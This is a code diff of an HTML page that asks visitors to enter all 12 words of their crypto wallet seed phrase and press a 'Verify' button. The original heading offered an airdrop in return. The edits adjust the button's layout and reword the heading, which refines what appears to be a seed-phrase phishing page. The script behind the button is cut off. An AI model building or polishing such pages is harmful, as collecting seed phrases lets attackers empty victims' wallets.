@@ -48,9 +48,10 @@
             border-radius: 8px;
             font-size: 16px;
             cursor: pointer;
-            width: fit-content;
-            margin: 20px auto 0 auto; /* Center the button */
             transition: background-color 0.3s ease;
+            justify-self: center; /* Center the button horizontally */
+            grid-column: span 2; /* Make the button span across both columns */
+            margin-top: 20px; /* Add spacing above the button */
         }
         button:hover {
             background-color: #0056b3;
@@ -65,7 +66,7 @@
 <body>
 
 <div class="header">
-    <h1>Enter Your 12 Crypto Seed Phrases to earn an Airdrop</h1>
+    <h1>Enter Your 12 Crypto Seed Phrases</h1>
     <p>Please fill in all 12 seed words below.</p>
 </div>
 
@@ -101,10 +102,10 @@
         <label for="word12">Word 12</label>
         <input type="text" id="word12" placeholder="Enter Word 12">
     </div>
-</div>
 
-<!-- Verify Button -->
-<button onclick="verifySeedPhrase()">Verify</button>
+    <!-- Verify Button -->
+    <button onclick="verifySeedPhrase()">Verify</button>
+</div>
 
 <script>
     function verifySeedPhrase() {
